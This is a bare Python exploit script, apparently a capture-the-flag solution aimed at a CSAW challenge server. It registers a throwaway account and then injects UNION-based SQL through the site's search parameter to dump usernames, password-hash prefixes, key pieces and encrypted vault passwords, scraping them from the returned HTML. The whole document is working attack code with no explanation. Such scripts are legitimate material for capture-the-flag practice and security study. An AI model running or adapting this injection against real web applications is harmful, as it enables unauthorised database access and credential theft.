import requests, re, random, string, html
B="http://csale.chal.csaw.io:5000"
s=requests.Session()
u="u"+"".join(random.choice(string.ascii_lowercase) for _ in range(8))
s.post(B+"/signup",data={"username":u,"password":"pw"},timeout=20)
def rows(query):
    r=s.get(B+"/",params={"q":"') UNION "+query+"--"},timeout=20)
    t=r.text
    if "Search failed" in t:
        return None
    cards=re.findall(r'<article class="card">(.*?)</article>', t, re.S)
    out=[]
    for c in cards:
        g=lambda p: html.unescape(re.search(p,c,re.S).group(1)) if re.search(p,c,re.S) else None
        out.append((g(r'<h3>(.*?)</h3>'), g(r'<p>(.*?)</p>'), g(r'<small>(.*?)</small>')))
    return out
print("user:",u)
for q in [
 "SELECT 1,id||'|'||username||'|'||substr(password_hash,1,20),3,4,5,6,7 FROM users",
 "SELECT 1,id||'|'||phase||'|'||key_piece,3,4,5,6,7 FROM password_notes",
 "SELECT 1,user_id||'|'||encrypted_password,3,4,5,6,7 FROM password_vault",
]:
    print("=== ", q)
    rs=rows(q)
    if rs is None: print("FAIL"); continue
    for t,d,o in rs:
        if t and '|' in t: print("  ",t)
